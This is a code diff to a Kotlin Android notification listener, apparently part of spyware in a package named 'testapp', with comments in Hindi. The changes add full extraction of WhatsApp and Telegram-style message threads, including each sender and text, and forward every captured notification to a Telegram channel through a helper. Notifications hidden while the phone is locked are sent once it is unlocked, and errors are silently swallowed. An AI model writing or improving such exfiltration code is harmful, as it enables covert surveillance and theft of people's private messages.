@@ -1,6 +1,7 @@
 package com.security.testapp
 
 import android.app.Notification
+import android.os.Build
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import java.util.Collections
@@ -30,45 +31,54 @@ class NotificationListener : NotificationListenerService() {
 
         try {
             val packageName = sbn.packageName
-            val notif = sbn.notification
+            val notification = sbn.notification
 
-            val usePublic = notif.visibility == Notification.VISIBILITY_PRIVATE
-            val extras = if (usePublic && notif.publicVersion != null) {
-                notif.publicVersion.extras
+            // 1. MessagingStyle से सारे मैसेज निकालें (WhatsApp, Telegram, आदि)
+            val messages = extractMessagesFromNotification(notification)
+
+            // 2. मैसेज बनाएँ
+            val finalMessage = if (messages.isNotEmpty()) {
+                messages.joinToString("\n") { msg ->
+                    val sender = msg.sender?.toString() ?: "Unknown"
+                    val text = msg.text?.toString() ?: ""
+                    "👤 $sender: $text"
+                }
             } else {
-                notif.extras
+                // अगर MessagingStyle नहीं है तो पुराने तरीके से टेक्स्ट निकालें
+                val extras = if (notification.visibility == Notification.VISIBILITY_PRIVATE && notification.publicVersion != null) {
+                    notification.publicVersion.extras
+                } else {
+                    notification.extras
+                }
+
+                val title = extras?.getString("android.title") ?: ""
+                val text = extras?.getCharSequence("android.text")?.toString() ?: ""
+                val bigText = extras?.getCharSequence("android.bigText")?.toString() ?: ""
+                val lines = extras?.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
+                var finalText = if (lines != null && lines.isNotEmpty()) {
+                    lines.joinToString("\n")
+                } else if (bigText.isNotEmpty()) bigText else text
+
+                if (finalText.isEmpty()) {
+                    finalText = extras?.getCharSequence("android.subText")?.toString() ?: ""
+                }
+                if (finalText.isEmpty()) {
+                    finalText = notification.tickerText?.toString() ?: ""
+                }
+
+                if (finalText.isEmpty()) {
+                    hiddenKeys.add(sbn.key)
+                    return
+                }
+
+                "📝 Title: $title\n💬 Text: <code>$finalText</code>"
             }
 
-            val title = extras?.getString("android.title") ?: ""
-            val bigText = extras?.getCharSequence("android.bigText")?.toString() ?: ""
-            val text = extras?.getCharSequence("android.text")?.toString() ?: ""
-
-            // मल्टी-लाइन टेक्स्ट (जैसे WhatsApp के कई मैसेज)
-            val linesArray = extras?.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
-            var finalText = if (linesArray != null && linesArray.isNotEmpty()) {
-                linesArray.joinToString("\n")
-            } else if (bigText.isNotEmpty()) bigText
-            else text
-
-            val subText = extras?.getCharSequence("android.subText")?.toString() ?: ""
-            val summaryText = extras?.getCharSequence("android.summaryText")?.toString() ?: ""
-            val ticker = notif.tickerText?.toString() ?: ""
-
-            if (finalText.isEmpty()) finalText = if (subText.isNotEmpty()) subText else summaryText
-            if (finalText.isEmpty()) finalText = ticker
-
-            if (finalText.isEmpty()) {
-                hiddenKeys.add(sbn.key)
-                return
-            }
-
-            val msg = "<b>🔔 Notification</b>\n" +
-                    "<b>📦 App:</b> $packageName\n" +
-                    "<b>📝 Title:</b> $title\n" +
-                    "<b>💬 Text:</b> <code>$finalText</code>"
+            val msg = "<b>🔔 Notification</b>\n<b>📦 App:</b> $packageName\n$finalMessage"
             TelegramHelper.sendWithFallback(msg, this, "HTML")
+
         } catch (e: Exception) {
-            // क्रैश से बचें
+            // silent
         }
     }
 
@@ -76,25 +86,28 @@ class NotificationListener : NotificationListenerService() {
         if (sbn != null) hiddenKeys.remove(sbn.key)
     }
 
+    /** Notification से MessagingStyle के messages निकालें (WhatsApp, आदि के लिए) */
+    private fun extractMessagesFromNotification(notification: Notification): List<Notification.MessagingStyle.Message> {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            val messagingStyle = Notification.MessagingStyle.extractMessagingStyleFromNotification(notification)
+            return messagingStyle?.messages ?: emptyList()
+        }
+        return emptyList()
+    }
+
     fun onUnlock() {
         val active = activeNotifications ?: return
         for (sbn in active) {
             if (hiddenKeys.remove(sbn.key)) {
                 try {
-                    val extras = sbn.notification.extras
-                    val title = extras?.getString("android.title") ?: ""
-                    val text = extras?.getCharSequence("android.text")?.toString() ?: ""
-                    val bigText = extras?.getCharSequence("android.bigText")?.toString() ?: ""
-                    val linesArray = extras?.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
-                    var finalText = if (linesArray != null && linesArray.isNotEmpty()) {
-                        linesArray.joinToString("\n")
-                    } else if (bigText.isNotEmpty()) bigText else text
-
-                    if (finalText.isEmpty()) finalText = "[Content Hidden]"
-                    val msg = "<b>🔓 Unlocked Notification</b>\n" +
-                            "<b>📦 App:</b> ${sbn.packageName}\n" +
-                            "<b>📝 Title:</b> $title\n" +
-                            "<b>💬 Text:</b> <code>$finalText</code>"
+                    val notification = sbn.notification
+                    val messages = extractMessagesFromNotification(notification)
+                    val finalMessage = if (messages.isNotEmpty()) {
+                        messages.joinToString("\n") { msg ->
+                            "👤 ${msg.sender}: ${msg.text}"
+                        }
+                    } else "[Content Hidden]"
+                    val msg = "<b>🔓 Unlocked Notification</b>\n<b>📦 App:</b> ${sbn.packageName}\n$finalMessage"
                     TelegramHelper.sendWithFallback(msg, this, "HTML")
                 } catch (_: Exception) {}
             }
